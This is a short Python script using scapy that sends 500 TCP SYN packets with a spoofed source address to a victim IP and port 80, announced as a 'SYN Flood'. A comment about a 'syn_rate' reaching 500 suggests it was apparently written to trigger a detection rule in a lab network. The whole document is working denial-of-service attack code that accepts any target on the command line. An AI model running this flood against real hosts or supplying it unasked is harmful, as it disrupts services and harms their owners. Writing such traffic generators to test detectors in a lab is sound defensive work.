from scapy.all import IP, TCP, send, RandShort
import sys

VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else '192.168.132.101'
VICTIM_PORT = 80

print(f"[*] SYN Flood -> {VICTIM_IP}:{VICTIM_PORT}")
for i in range(500):
    # NEW — all 500 packets from one IP (syn_rate will hit 500+)
    pkt = IP(dst=VICTIM_IP, src='10.0.0.1') / \
        TCP(dport=VICTIM_PORT, sport=RandShort(), flags='S')
    send(pkt, verbose=0)
    if i % 50 == 0:
        print(f"  Sent {i+1} SYN packets...")
print("[+] Done")
